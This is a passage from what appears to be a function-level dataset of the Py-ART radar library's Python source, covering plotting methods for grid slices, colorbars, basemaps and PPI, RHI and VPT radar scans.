            Field to be plotted.
        y_index : float
            Index of the latitudinal level to plot.
        vmin, vmax : float
            Lower and upper range for the colormesh. If either parameter is
            None, a value will be determined from the field attributes (if
            available) or the default values of -8, 64 will be used.
            Parameters are ignored is norm is not None.
        norm : Normalize or None, optional
            matplotlib Normalize instance used to scale luminance data. If not
            None the vmax and vmin parameters are ignored. If None, vmin and
            vmax are used for luminance scaling.
        cmap : str or None
            Matplotlib colormap name. None will use the default colormap for
            the field being plotted as specified by the Py-ART configuration.
        mask_outside : bool
            True to mask data outside of vmin, vmax. False performs no
            masking.
        title : str
            Title to label plot with, None to use default title generated from
            the field and lat,lon parameters. Parameter is ignored if
            title_flag is False.
        title_flag : bool
            True to add a title to the plot, False does not add a title.
        axislabels : (str, str)
            2-tuple of x-axis, y-axis labels. None for either label will use
            the default axis label. Parameter is ignored if axislabels_flag is
            False.
        axislabels_flag : bool
            True to add label the axes, False does not label the axes.
        colorbar_flag : bool
            True to add a colorbar with label to the axis.  False leaves off
            the colorbar.
        colorbar_label : str
            Colorbar label, None will use a default label generated from the
            field information.
        colorbar_orient : 'vertical' or 'horizontal'
            Colorbar orientation.
        edges : bool
            True will interpolate and extrapolate the gate edges from the
            range, azimuth and elevations in the radar, treating these
            as specifying the center of each gate. False treats these
            coordinates themselved as the gate edges, resulting in a plot
            in which the last gate in each ray and the entire last ray are not
            not plotted.
        ax : Axis
            Axis to plot on. None will use the current axis.
        fig : Figure
            Figure to add the colorbar to. None will use the current figure.
        ticks : array
            Colorbar custom tick label locations.
        ticklabs : array
            Colorbar custom tick labels.

        """"""
    (ax, fig) = common.parse_ax_fig(ax, fig)
    (vmin, vmax) = common.parse_vmin_vmax(self.grid, field, vmin, vmax)
    cmap = common.parse_cmap(cmap, field)
    data = self.grid.fields[field]['data'][:, y_index, :]
    if mask_outside:
        data = np.ma.masked_invalid(data)
        data = np.ma.masked_outside(data, vmin, vmax)
    x_1d = self.grid.x['data'] / 1000.0
    z_1d = self.grid.z['data'] / 1000.0
    if edges:
        if len(x_1d) > 1:
            x_1d = _interpolate_axes_edges(x_1d)
        if len(z_1d) > 1:
            z_1d = _interpolate_axes_edges(z_1d)
    (xd, yd) = np.meshgrid(x_1d, z_1d)
    if norm is not None:
        vmin = vmax = None
    pm = ax.pcolormesh(xd, yd, data, vmin=vmin, vmax=vmax, norm=norm, cmap=cmap, **kwargs)
    self.mappables.append(pm)
    self.fields.append(field)
    if title_flag:
        if title is None:
            ax.set_title(common.generate_latitudinal_level_title(self.grid, field, y_index))
        else:
            ax.set_title(title)
    if axislabels_flag:
        self._label_axes_latitude(axislabels, ax)
    if colorbar_flag:
        self.plot_colorbar(mappable=pm, label=colorbar_label, orientation=colorbar_orient, field=field, ax=ax, fig=fig, ticks=ticks, ticklabs=ticklabs)
    return"
ARM-DOE/pyart,plot_longitude_slice,"def plot_longitude_slice(self, field, lon=None, lat=None, **kwargs):
    """"""
        Plot a slice along a given longitude.

        For documentation of additional arguments see
        :py:func:`plot_longitudinal_level`.

        Parameters
        ----------
        field : str
            Field to be plotted.
        lon, lat : float
            Longitude and latitude (in degrees) specifying the slice. If
            None the center of the grid is used.

        """"""
    (x_index, _) = self._find_nearest_grid_indices(lon, lat)
    self.plot_longitudinal_level(field=field, x_index=x_index, **kwargs)"
ARM-DOE/pyart,plot_longitudinal_level,"def plot_longitudinal_level(self, field, x_index, vmin=None, vmax=None, norm=None, cmap=None, mask_outside=False, title=None, title_flag=True, axislabels=(None, None), axislabels_flag=True, colorbar_flag=True, colorbar_label=None, colorbar_orient='vertical', edges=True, ax=None, fig=None, ticks=None, ticklabs=None, **kwargs):
    """"""
        Plot a slice along a given longitude.

        Additional arguments are passed to Basemaps's pcolormesh function.

        Parameters
        ----------
        field : str
            Field to be plotted.
        x_index : float
            Index of the longitudinal level to plot.
        vmin, vmax : float
            Lower and upper range for the colormesh. If either parameter is
            None, a value will be determined from the field attributes (if
            available) or the default values of -8, 64 will be used.
            Parameters are ignored is norm is not None.
        norm : Normalize or None, optional
            matplotlib Normalize instance used to scale luminance data. If not
            None the vmax and vmin parameters are ignored. If None, vmin and
            vmax are used for luminance scaling.
        cmap : str or None
            Matplotlib colormap name. None will use the default colormap for
            the field being plotted as specified by the Py-ART configuration.
        mask_outside : bool
            True to mask data outside of vmin, vmax. False performs no
            masking.
        title : str
            Title to label plot with, None to use default title generated from
            the field and lat,lon parameters. Parameter is ignored if
            title_flag is False.
        title_flag : bool
            True to add a title to the plot, False does not add a title.
        axislabels : (str, str)
            2-tuple of x-axis, y-axis labels. None for either label will use
            the default axis label. Parameter is ignored if axislabels_flag is
            False.
        axislabels_flag : bool
            True to add label the axes, False does not label the axes.
        colorbar_flag : bool
            True to add a colorbar with label to the axis. False leaves off
            the colorbar.
        colorbar_label : str
            Colorbar label, None will use a default label generated from the
            field information.
        colorbar_orient : 'vertical' or 'horizontal'
            Colorbar orientation.
        edges : bool
            True will interpolate and extrapolate the gate edges from the
            range, azimuth and elevations in the radar, treating these
            as specifying the center of each gate. False treats these
            coordinates themselved as the gate edges, resulting in a plot
            in which the last gate in each ray and the entire last ray are not
            not plotted.
        ax : Axis
            Axis to plot on. None will use the current axis.
        fig : Figure
            Figure to add the colorbar to. None will use the current figure.
        ticks : array
            Colorbar custom tick label locations.
        ticklabs : array
            Colorbar custom tick labels.

        """"""
    (ax, fig) = common.parse_ax_fig(ax, fig)
    (vmin, vmax) = common.parse_vmin_vmax(self.grid, field, vmin, vmax)
    cmap = common.parse_cmap(cmap, field)
    data = self.grid.fields[field]['data'][:, :, x_index]
    if mask_outside:
        data = np.ma.masked_invalid(data)
        data = np.ma.masked_outside(data, vmin, vmax)
    y_1d = self.grid.y['data'] / 1000.0
    z_1d = self.grid.z['data'] / 1000.0
    if edges:
        if len(y_1d) > 1:
            y_1d = _interpolate_axes_edges(y_1d)
        if len(z_1d) > 1:
            z_1d = _interpolate_axes_edges(z_1d)
    (xd, yd) = np.meshgrid(y_1d, z_1d)
    if norm is not None:
        vmin = vmax = None
    pm = ax.pcolormesh(xd, yd, data, vmin=vmin, vmax=vmax, cmap=cmap, norm=norm, **kwargs)
    self.mappables.append(pm)
    self.fields.append(field)
    if title_flag:
        if title is None:
            ax.set_title(common.generate_longitudinal_level_title(self.grid, field, x_index))
        else:
            ax.set_title(title)
    if axislabels_flag:
        self._label_axes_longitude(axislabels, ax)
    if colorbar_flag:
        self.plot_colorbar(mappable=pm, label=colorbar_label, orientation=colorbar_orient, field=field, ax=ax, fig=fig, ticks=ticks, ticklabs=ticklabs)
    return"
ARM-DOE/pyart,plot_colorbar,"def plot_colorbar(self, mappable=None, orientation='horizontal', label=None, cax=None, ax=None, fig=None, field=None, ticks=None, ticklabs=None):
    """"""
        Plot a colorbar.

        Parameters
        ----------
        mappable : Image, ContourSet, etc.
            Image, ContourSet, etc to which the colorbar applied. If None the
            last mappable object will be used.
        field : str
            Field to label colorbar with.
        label : str
            Colorbar label. None will use a default value from the last field
            plotted.
        orient : str
            Colorbar orientation, either 'vertical' [default] or 'horizontal'.
        cax : Axis
            Axis onto which the colorbar will be drawn. None is also valid.
        ax : Axes
            Axis onto which the colorbar will be drawn. None is also valid.
        fig : Figure
            Figure to place colorbar on. None will use the current figure.
        ticks : array
            Colorbar custom tick label locations.
        ticklabs : array
            Colorbar custom tick labels.

        """"""
    if fig is None:
        fig = plt.gcf()
    if mappable is None:
        if len(self.mappables) == 0:
            raise ValueError('mappable must be specified.')
        else:
            mappable = self.mappables[-1]
    if label is None:
        if len(self.fields) == 0:
            raise ValueError('field must be specified.')
        field = self.grid.fields[self.fields[-1]]
        if 'long_name' in field and 'units' in field:
            label = field['long_name'] + '(' + field['units'] + ')'
        else:
            label = ''
    cb = fig.colorbar(mappable, orientation=orientation, ax=ax, cax=cax)
    if ticks is not None:
        cb.set_ticks(ticks)
    if ticklabs is not None:
        cb.set_ticklabels(ticklabs)
    cb.set_label(label)
    return"
ARM-DOE/pyart,_make_basemap,"def _make_basemap(self, resolution='l', area_thresh=10000, auto_range=True, min_lon=-92, max_lon=-86, min_lat=40, max_lat=44, ax=None, **kwargs):
    """"""
        Make a basemap.

        Parameters
        ----------
        auto_range : bool
            True to determine map ranges from the latitude and longitude limits
            of the grid. False will use the min_lon, max_lon, min_lat, and
            max_lat parameters for the map range.
        min_lat, max_lat, min_lon, max_lon : float
            Latitude and longitude ranges for the map projection region in
            degrees.  These parameter are not used if auto_range is True.
        resolution : 'c', 'l', 'i', 'h', or 'f'.
            Resolution of boundary database to use. See Basemap documentation
            for details.
        area_thresh : int
            Basemap area_thresh parameter. See Basemap documentation.
        ax : axes or None.
            Axis to add the basemap to, if None the current axis is used.
        kwargs : Basemap options
            Options to be passed to Basemap. If projection is not specified
            here it uses proj='merc' (mercator).

        """"""
    ax = common.parse_ax(ax)
    if auto_range:
        max_lat = self.grid.point_latitude['data'][0].max()
        max_lon = self.grid.point_longitude['data'][0].max()
        min_lat = self.grid.point_latitude['data'][0].min()
        min_lon = self.grid.point_longitude['data'][0].min()
    if self.debug:
        print('Maximum latitude: ', max_lat)
        print('Maximum longitude: ', max_lon)
        print('Minimum latitude: ', min_lat)
        print('Minimum longitute: ', min_lon)
    lat_0 = self.grid.origin_latitude['data'][0]
    lon_0 = self.grid.origin_longitude['data'][0]
    default_args = {'lat_0': lat_0, 'lon_0': lon_0, 'lat_ts': lat_0, 'projection': 'merc', 'area_thresh': area_thresh, 'resolution': resolution, 'ax': ax}
    using_corners = None not in [min_lon, min_lat, max_lon, max_lat]
    if using_corners:
        default_args['llcrnrlon'] = min_lon
        default_args['llcrnrlat'] = min_lat
        default_args['urcrnrlon'] = max_lon
        default_args['urcrnrlat'] = max_lat
    else:
        x = self.grid.x['data'][0]
        y = self.grid.y['data'][0]
        default_args['width'] = x.max() - x.min()
        default_args['height'] = y.max() - y.min()
    for key in default_args.keys():
        if key not in kwargs:
            kwargs[key] = default_args[key]
    self.basemap = Basemap(**kwargs)
    return self.basemap"
ARM-DOE/pyart,_find_nearest_grid_indices,"def _find_nearest_grid_indices(self, lon, lat):
    """"""
        Find the nearest x, y grid indices for a given latitude and longitude.
        """"""
    (lon, lat) = common.parse_lon_lat(self.grid, lon, lat)
    (grid_lons, grid_lats) = self.grid.get_point_longitude_latitude()
    diff = (grid_lats - lat) ** 2 + (grid_lons - lon) ** 2
    (y_index, x_index) = np.unravel_index(diff.argmin(), diff.shape)
    return (x_index, y_index)"
ARM-DOE/pyart,_get_label_x,"def _get_label_x(self):
    """"""Get default label for x units.""""""
    return 'East West distance from ' + self.origin + ' (km)'"
ARM-DOE/pyart,_get_label_y,"def _get_label_y(self):
    """"""Get default label for y units.""""""
    return 'North South distance from ' + self.origin + ' (km)'"
ARM-DOE/pyart,_get_label_z,"def _get_label_z(self):
    """"""Get default label for z units.""""""
    return 'Distance Above ' + self.origin + '  (km)'"
ARM-DOE/pyart,_label_axes_grid,"def _label_axes_grid(self, axis_labels, ax):
    """"""Set the x and y axis labels for a grid plot.""""""
    (x_label, y_label) = axis_labels
    if x_label is None:
        x_label = self._get_label_x()
    if y_label is None:
        y_label = self._get_label_y()
    ax.set_xlabel(x_label)
    ax.set_ylabel(y_label)"
ARM-DOE/pyart,_label_axes_longitude,"def _label_axes_longitude(self, axis_labels, ax):
    """"""Set the x and y axis labels for a longitude slice.""""""
    (x_label, y_label) = axis_labels
    if x_label is None:
        x_label = self._get_label_y()
    if y_label is None:
        y_label = self._get_label_z()
    ax.set_xlabel(x_label)
    ax.set_ylabel(y_label)"
ARM-DOE/pyart,_label_axes_latitude,"def _label_axes_latitude(self, axis_labels, ax):
    """"""Set the x and y axis labels for a latitude slice.""""""
    (x_label, y_label) = axis_labels
    if x_label is None:
        x_label = self._get_label_x()
    if y_label is None:
        y_label = self._get_label_z()
    ax.set_xlabel(x_label)
    ax.set_ylabel(y_label)"
ARM-DOE/pyart,generate_filename,"def generate_filename(self, field, level, ext='png'):
    """"""
        Generate a filename for a grid plot.

        Generated filename has form:
            grid_name_field_level_time.ext

        Parameters
        ----------
        field : str
            Field plotted.
        level : int
            Level plotted.
        ext : str
            Filename extension.

        Returns
        -------
        filename : str
            Filename suitable for saving a plot.

        """"""
    return common.generate_grid_filename(self.grid, field, level, ext)"
ARM-DOE/pyart,generate_grid_title,"def generate_grid_title(self, field, level):
    """"""
        Generate a title for a plot.

        Parameters
        ----------
        field : str
            Field plotted.
        level : int
            Verical level plotted.

        Returns
        -------
        title : str
            Plot title.

        """"""
    return common.generate_grid_title(self.grid, field, level)"
ARM-DOE/pyart,generate_longitudinal_level_title,"def generate_longitudinal_level_title(self, field, level):
    """"""
        Generate a title for a plot.

        Parameters
        ----------
        field : str
            Field plotted.
        level : int
            Longitudinal level plotted.

        Returns
        -------
        title : str
            Plot title.

        """"""
    return common.generate_longitudinal_level_title(self.grid, field, level)"
ARM-DOE/pyart,generate_latitudinal_level_title,"def generate_latitudinal_level_title(self, field, level):
    """"""
        Generate a title for a plot.

        Parameters
        ----------
        field : str
            Field plotted.
        level : int
            Longitudinal level plotted.

        Returns
        -------
        title : str
            Plot title.

        """"""
    return common.generate_latitudinal_level_title(self.grid, field, level)"
ARM-DOE/pyart,get_basemap,"def get_basemap(self):
    """"""get basemap of the plot""""""
    if self.basemap is None:
        self._make_basemap()
    return self.basemap"
ARM-DOE/pyart,_mask_outside,"def _mask_outside(flag, data, v1, v2):
    """"""Return the data masked outside of v1 and v2 when flag is True.""""""
    if flag:
        data = np.ma.masked_invalid(data)
        data = np.ma.masked_outside(data, v1, v2)
    return data"
ARM-DOE/pyart,_edge_time,"def _edge_time(times):
    """"""Appends the last time with the added subtraction of the last two
    times in the time array.""""""
    timedelta = times[-1] - times[-2]
    edge_time = times[-1] + timedelta
    return np.append(times, edge_time)"
ARM-DOE/pyart,__init__,"def __init__(self, radar, shift=(0.0, 0.0)):
    """"""Initialize the object.""""""
    self._radar = radar
    self.fields = radar.fields
    self.scan_type = radar.scan_type
    self.ranges = radar.range['data']
    self.azimuths = radar.azimuth['data']
    self.elevations = radar.elevation['data']
    self.fixed_angle = radar.fixed_angle['data']
    if radar.antenna_transition is None:
        self.antenna_transition = None
    else:
        self.antenna_transition = radar.antenna_transition['data']
    if shift != (0.0, 0.0):
        self.origin = 'origin'
    else:
        self.origin = 'radar'
    self.shift = shift
    if radar.latitude['data'].size == 1:
        lat = float(radar.latitude['data'])
        lon = float(radar.longitude['data'])
    else:
        lat = np.median(radar.latitude['data'])
        lon = np.median(radar.longitude['data'])
        warnings.warn('RadarDisplay does not correct for moving platforms')
    self.loc = (lat, lon)
    self.plots = []
    self.plot_vars = []
    self.cbs = []"
ARM-DOE/pyart,plot,"def plot(self, field, sweep=0, **kwargs):
    """"""
        Create a plot appropiate for the radar.

        This function calls the plotting function corresponding to
        the scan_type of the radar. Additional keywords can be passed to
        customize the plot, see the appropiate plot function for the
        allowed keywords.

        Parameters
        ----------
        field : str
            Field to plot.
        sweep : int
            Sweep number to plot, not used for VPT scans.

        See Also
        --------
        plot_ppi : Plot a PPI scan
        plot_rhi : Plot a RHI scan
        plot_vpt : Plot a VPT scan

        """"""
    if self.scan_type == 'ppi' or self.scan_type == 'sector':
        self.plot_ppi(field, sweep, **kwargs)
    elif self.scan_type == 'rhi':
        self.plot_rhi(field, sweep, **kwargs)
    elif self.scan_type == 'vpt':
        self.plot_vpt(field, **kwargs)
    else:
        raise ValueError('unknown scan_type % s' % self.scan_type)
    return"
ARM-DOE/pyart,plot_ray,"def plot_ray(self, field, ray, format_str='k-', mask_tuple=None, ray_min=None, ray_max=None, mask_outside=False, title=None, title_flag=True, axislabels=(None, None), gatefilter=None, axislabels_flag=True, ax=None, fig=None):
    """"""
        Plot a single ray.

        Parameters
        ----------
        field : str
            Field to plot.
        ray : int
            Ray number to plot.

        Other Parameters
        ----------------
        format_str : str
            Format string defining the line style and marker.
        mask_tuple : (str, float)
            Tuple containing the field name and value below which to mask
            field prior to plotting, for example to mask all data where
            NCP < 0.5 set mask_tuple to ['NCP', 0.5]. None performs no masking.
        ray_min : float
            Minimum ray value, None for default value, ignored if mask_outside
            is False.
        ray_max : float
            Maximum ray value, None for default value, ignored if mask_outside
            is False.
        mask_outside : bool
            True to mask data outside of vmin, vmax. False performs no
            masking.
        title : str
            Title to label plot with, None to use default title generated from
            the field and ray parameters. Parameter is ignored if title_flag
            is False.
        title_flag : bool
            True to add a title to the plot, False does not add a title.
        gatefilter : GateFilter
            GateFilter instance. None will result in no gatefilter mask being
            applied to data.
        axislabels : (str, str)
            2-tuple of x-axis, y-axis labels. None for either label will use
            the default axis label. Parameter is ignored if axislabels_flag is
            False.
        axislabels_flag : bool
            True to add label the axes, False does not label the axes.
        ax : Axis
            Axis to plot on. None will use the current axis.
        fig : Figure
            Figure to add the colorbar to. None will use the current figure.

        """"""
    (ax, fig) = common.parse_ax_fig(ax, fig)
    data = self._get_ray_data(field, ray, mask_tuple, gatefilter)
    data = _mask_outside(mask_outside, data, ray_min, ray_max)
    (line,) = ax.plot(self.ranges / 1000.0, data, format_str)
    if title_flag:
        self._set_ray_title(field, ray, title, ax)
    if axislabels_flag:
        self._label_axes_ray(axislabels, field, ax)
    self.plots.append(line)
    self.plot_vars.append(field)"
ARM-DOE/pyart,plot_ppi,"def plot_ppi(self, field, sweep=0, mask_tuple=None, vmin=None, vmax=None, norm=None, cmap=None, mask_outside=False, title=None, title_flag=True, axislabels=(None, None), axislabels_flag=True, colorbar_flag=True, colorbar_label=None, colorbar_orient='vertical', edges=True, gatefilter=None, filter_transitions=True, ax=None, fig=None, ticks=None, ticklabs=None, raster=False, title_datetime_format=None, title_use_sweep_time=True, **kwargs):
    """"""
        Plot a PPI.

        Additional arguments are passed to Matplotlib's pcolormesh function.

        Parameters
        ----------
        field : str
            Field to plot.
        sweep : int, optional
            Sweep number to plot.

        Other Parameters
        ----------------
        mask_tuple : (str, float)
            Tuple containing the field name and value below which to mask
            field prior to plotting, for example to mask all data where
            NCP < 0.5 set mask_tuple to ['NCP', 0.5]. None performs no masking.
        vmin : float
            Luminance minimum value, None for default value.
            Parameter is ignored is norm is not None.
        vmax : float
            Luminance maximum value, None for default value.
            Parameter is ignored is norm is not None.
        norm : Normalize or None, optional
            matplotlib Normalize instance used to scale luminance data. If not
            None the vmax and vmin parameters are ignored. If None, vmin and
            vmax are used for luminance scaling.
        cmap : str or None
            Matplotlib colormap name. None will use the default colormap for
            the field being plotted as specified by the Py-ART configuration.
        mask_outside : bool
            True to mask data outside of vmin, vmax. False performs no
            masking.
        title : str
            Title to label plot with, None to use default title generated from
            the field and sweep parameters. Parameter is ignored if title_flag
            is False.
        title_datetime_format : str
            Format of datetime in the title (using strftime format).
        title_use_sweep_time : bool
            True for the current sweep's beginning time to be used for the
            title. False for the radar's beginning time.
        title_flag : bool
            True to add a title to the plot, False does not add a title.
        axislabels : (str, str)
            2-tuple of x-axis, y-axis labels. None for either label will use
            the default axis label. Parameter is ignored if axislabels_flag is
            False.
        axislabels_flag : bool
            True to add label the axes, False does not label the axes.
        colorbar_flag : bool
            True to add a colorbar with label to the axis. False leaves off
            the colorbar.
        colorbar_label : str
            Colorbar label, None will use a default label generated from the
            field information.
        colorbar_orient : 'vertical' or 'horizontal'
            Colorbar orientation.
        ticks : array
            Colorbar custom tick label locations.
        ticklabs : array
            Colorbar custom tick labels.
        edges : bool
            True will interpolate and extrapolate the gate edges from the
            range, azimuth and elevations in the radar, treating these
            as specifying the center of each gate. False treats these
            coordinates themselves as the gate edges, resulting in a plot
            in which the last gate in each ray and the entire last ray are not
            plotted.
        gatefilter : GateFilter
            GateFilter instance. None will result in no gatefilter mask being
            applied to data.
        filter_transitions : bool
            True to remove rays where the antenna was in transition between
            sweeps from the plot. False will include these rays in the plot.
            No rays are filtered when the antenna_transition attribute of the
            underlying radar is not present.
        ax : Axis
            Axis to plot on. None will use the current axis.
        fig : Figure
            Figure to add the colorbar to. None will use the current figure.
        raster : bool
            False by default. Set to true to render the display as a raster
            rather than a vector in call to pcolormesh. Saves time in plotting
            high resolution data over large areas. Be sure to set the dpi
            of the plot for your application if you save it as a vector format
            (i.e., pdf, eps, svg).

        """"""
    (ax, fig) = common.parse_ax_fig(ax, fig)
    (vmin, vmax) = common.parse_vmin_vmax(self._radar, field, vmin, vmax)
    cmap = common.parse_cmap(cmap, field)
    data = self._get_data(field, sweep, mask_tuple, filter_transitions, gatefilter)
    (x, y) = self._get_x_y(sweep, edges, filter_transitions)
    data = _mask_outside(mask_outside, data, vmin, vmax)
    if norm is not None:
        vmin = vmax = None
    pm = ax.pcolormesh(x, y, data, vmin=vmin, vmax=vmax, cmap=cmap, norm=norm, **kwargs)
    if raster:
        pm.set_rasterized(True)
    if title_flag:
        self._set_title(field, sweep, title, ax, datetime_format=title_datetime_format, use_sweep_time=title_use_sweep_time)
    if axislabels_flag:
        self._label_axes_ppi(axislabels, ax)
    self.plots.append(pm)
    self.plot_vars.append(field)
    if colorbar_flag:
        self.plot_colorbar(mappable=pm, label=colorbar_label, orient=colorbar_orient, field=field, ax=ax, fig=fig, ticks=ticks, ticklabs=ticklabs)"
ARM-DOE/pyart,plot_rhi,"def plot_rhi(self, field, sweep=0, mask_tuple=None, vmin=None, vmax=None, norm=None, cmap=None, mask_outside=False, title=None, title_flag=True, axislabels=(None, None), axislabels_flag=True, reverse_xaxis=None, colorbar_flag=True, colorbar_label=None, colorbar_orient='vertical', edges=True, gatefilter=None, filter_transitions=True, ax=None, fig=None, ticks=None, ticklabs=None, raster=False, title_datetime_format=None, title_use_sweep_time=True, **kwargs):
    """"""
        Plot a RHI.

        Additional arguments are passed to Matplotlib's pcolormesh function.

        Parameters
        ----------
        field : str
            Field to plot.
        sweep : int,
            Sweep number to plot.

        Other Parameters
        ----------------
        mask_tuple : (str, float)
            2-Tuple containing the field name and value below which to mask
            field prior to plotting, for example to mask all data where
            NCP < 0.5 set mask to ['NCP', 0.5]. None performs no masking.
        vmin : float
            Luminance minimum value, None for default value.
            Parameter is ignored is norm is not None.
        vmax : float
            Luminance maximum value, None for default value.
            Parameter is ignored is norm is not None.
        norm : Normalize or None, optional
            matplotlib Normalize instance used to scale luminance data. If not
            None the vmax and vmin parameters are ignored. If None, vmin and
            vmax are used for luminance scaling.
        cmap : str or None
            Matplotlib colormap name. None will use the default colormap for
            the field being plotted as specified by the Py-ART configuration.
        title : str
            Title to label plot with, None to use default title generated from
            the field and sweep parameters. Parameter is ignored if title_flag
            is False.
        title_datetime_format : str
            Format of datetime in the title (using strftime format).
        title_use_sweep_time : bool
            True for the current sweep's beginning time to be used for the
            title. False for the radar's beginning time.
        title_flag : bool
            True to add a title to the plot, False does not add a title.
        axislabels : (str, str)
            2-tuple of x-axis, y-axis labels. None for either label will use
            the default axis label. Parameter is ignored if axislabels_flag is
            False.
        axislabels_flag : bool
            True to add label the axes, False does not label the axes.
        reverse_xaxis : bool or None
            True to reverse the x-axis so the plot reads east to west, False
            to have east to west. None (the default) will reverse the axis
            only when all the distances are negative.
        colorbar_flag : bool
            True to add a colorbar with label to the axis. False leaves off
            the colorbar.
        colorbar_label : str
            Colorbar label, None will use a default label generated from the
            field information.
        colorbar_orient : 'vertical' or 'horizontal'
            Colorbar orientation.
        ticks : array
            Colorbar custom tick label locations.
        ticklabs : array
            Colorbar custom tick labels.
        edges : bool
            True will interpolate and extrapolate the gate edges from the
            range, azimuth and elevations in the radar, treating these
            as specifying the center of each gate. False treats these
            coordinates themselves as the gate edges, resulting in a plot
            in which the last gate in each ray and the entire last ray are not
            not plotted.
        gatefilter : GateFilter
            GateFilter instance. None will result in no gatefilter mask being
            applied to data.
        filter_transitions : bool
            True to remove rays where the antenna was in transition between
            sweeps from the plot. False will include these rays in the plot.
            No rays are filtered when the antenna_transition attribute of the
            underlying radar is not present.
        ax : Axis
            Axis to plot on. None will use the current axis.
        fig : Figure
            Figure to add the colorbar to. None will use the current figure.
        raster : bool
            False by default. Set to true to render the display as a raster
            rather than a vector in call to pcolormesh. Saves time in plotting
            high resolution data over large areas. Be sure to set the dpi
            of the plot for your application if you save it as a vector format
            (i.e., pdf, eps, svg).

        """"""
    (ax, fig) = common.parse_ax_fig(ax, fig)
    (vmin, vmax) = common.parse_vmin_vmax(self._radar, field, vmin, vmax)
    cmap = common.parse_cmap(cmap, field)
    data = self._get_data(field, sweep, mask_tuple, filter_transitions, gatefilter)
    (x, y, z) = self._get_x_y_z(sweep, edges, filter_transitions)
    data = _mask_outside(mask_outside, data, vmin, vmax)
    sweep_slice = self._radar.get_slice(sweep)
    az_median = np.abs(np.median(self._radar.azimuth['data'][sweep_slice]))
    if 89.5 <= az_median <= 90.0 or 269.0 <= az_median <= 271.0:
        R = np.sqrt(x ** 2 + y ** 2) * np.sign(x)
    else:
        R = np.sqrt(x ** 2 + y ** 2) * np.sign(y)
    if reverse_xaxis is None:
        reverse_xaxis = np.all(R < 1.0)
    if reverse_xaxis:
        R = -R
    if norm is not None:
        vmin = vmax = None
    pm = ax.pcolormesh(R, z, data, vmin=vmin, vmax=vmax, cmap=cmap, norm=norm, **kwargs)
    if raster:
        pm.set_rasterized(True)
    if title_flag:
        self._set_title(field, sweep, title, ax, datetime_format=title_datetime_format, use_sweep_time=title_use_sweep_time)
    if axislabels_flag:
        self._label_axes_rhi(axislabels, ax)
    self.plots.append(pm)
    self.plot_vars.append(field)
    if colorbar_flag:
        self.plot_colorbar(mappable=pm, label=colorbar_label, orient=colorbar_orient, field=field, ax=ax, fig=fig, ticks=ticks, ticklabs=ticklabs)"
ARM-DOE/pyart,plot_vpt,"def plot_vpt(self, field, mask_tuple=None, vmin=None, vmax=None, norm=None, cmap=None, mask_outside=False, title=None, title_flag=True, axislabels=(None, None), axislabels_flag=True, colorbar_flag=True, colorbar_label=None, colorbar_orient='vertical', edges=True, gatefilter=None, filter_transitions=True, time_axis_flag=False, date_time_form=None, tz=None, ax=None, fig=None, ticks=None, ticklabs=None, raster=False, **kwargs):
    """"""
        Plot a VPT scan.

        Additional arguments are passed to Matplotlib's pcolormesh function.

        Parameters
        ----------
        field : str
            Field to plot.

        Other Parameters
        ----------------
        mask_tuple : (str, float)
            Tuple containing the field name and value below which to mask
            field prior to plotting, for example to mask all data where
            NCP < 0.5 set mask_tuple to ['NCP', 0.5]. None performs no masking.
        vmin : float
            Luminance minimum value, None for default value.
            Parameter is ignored is norm is not None.
        vmax : float
            Luminance maximum value, None for default value.
            Parameter is ignored is norm is not None.
        norm : Normalize or None, optional
            matplotlib Normalize instance used to scale luminance data. If not
            None the vmax and vmin parameters are ignored. If None, vmin and
            vmax are used for luminance scaling.
        cmap : str or None
            Matplotlib colormap name. None will use the default colormap for
            the field being plotted as specified by the Py-ART configuration.
        mask_outside : bool
            True to mask data outside of vmin, vmax. False performs no
            masking.
        title : str
            Title to label plot with, None to use default title generated from
            the field and sweep parameters. Parameter is ignored if title_flag
            is False.
        title_flag : bool
            True to add a title to the plot, False does not add a title.
        axislabels : (str, str)
            2-tuple of x-axis, y-axis labels. None for either label will use
            the default axis label. Parameter is ignored if axislabels_flag is
            False.
        axislabels_flag : bool
            True to add label the axes, False does not label the axes.
        colorbar_flag : bool
            True to add a colorbar with label to the axis. False leaves off
            the colorbar.
        colorbar_label : str
            Colorbar label, None will use a default label generated from the
            field information.
        ticks : array
            Colorbar custom tick label locations.
        ticklabs : array
            Colorbar custom tick labels.
        colorbar_orient : 'vertical' or 'horizontal'
            Colorbar orientation.
        edges : bool
            True will interpolate and extrapolate the gate edges from the
            range, azimuth and elevations in the radar, treating these
            as specifying the center of each gate. False treats these
            coordinates themselves as the gate edges, resulting in a plot
            in which the last gate in each ray and the entire last ray are not
            not plotted.
        gatefilter : GateFilter
            GateFilter instance. None will result in no gatefilter mask being
            applied to data.
        filter_transitions : bool
            True to remove rays where the antenna was in transition between
            sweeps from the plot. False will include these rays in the plot.
            No rays are filtered when the antenna_transition attribute of the
            underlying radar is not present.
        time_axis_flag : bool
            True to plot the x-axis as time. False uses the index number.
            Default is False - index-based.
        date_time_form : str, optional
            Format of the time string for x-axis labels. Parameter is
            ignored if time_axis_flag is set to False.
        tz : str, optional
            Time zone info to use when creating axis labels (see datetime).
            Parameter is ignored if time_axis_flag is set to False.
        ax : Axis
            Axis to plot on. None will use the current axis.
        fig : Figure
            Figure to add the colorbar to. None will use the current figure.
        raster : bool
            False by default. Set to true to render the display as a raster
            rather than a vector in call to pcolormesh. Saves time in plotting
            high resolution data over large areas.  Be sure to set the dpi
            of the plot for your application if you save it as a vector format
            (i.e., pdf, eps, svg).

        """"""
    (ax, fig) = common.parse_ax_fig(ax, fig)
    (vmin, vmax) = common.parse_vmin_vmax(self._radar, field, vmin, vmax)
    cmap = common.parse_cmap(cmap, field)
    data = self._get_vpt_data(field, mask_tuple, filter_transitions, gatefilter)
    if edges:
        y = np.empty((self.ranges.shape[0] + 1,), dtype=self.ranges.dtype)
        y[1:-1] = (self.ranges[:-1] + self.ranges[1:]) / 2.0
        y[0] = self.ranges[0] - (self.ranges[1] - self.ranges[0]) / 2.0
        y[-1] = self.ranges[-1] - (self.ranges[-2] - self.ranges[-1]) / 2.0
        y[y < 0] = 0
        y = y / 1000.0
        x = np.arange(data.shape[1] + 1)
    else:
        x = np.arange(data.shape[1])
        y = self.ranges / 1000.0
    if time_axis_flag:
        self._set_vpt_time_axis(ax, date_time_form=date_time_form, tz=tz)
        times = datetimes_from_radar(self._radar)
        if edges:
            times = _edge_time(times)
        x = times.astype('datetime64[ns]')
    data = _mask_outside(mask_outside, data, vmin, vmax)
    if norm is not None:
        vmin = vmax = None
    pm = ax.pcolormesh(x, y, data, vmin=vmin, vmax=vmax, cmap=cmap, norm=norm, **kwargs)
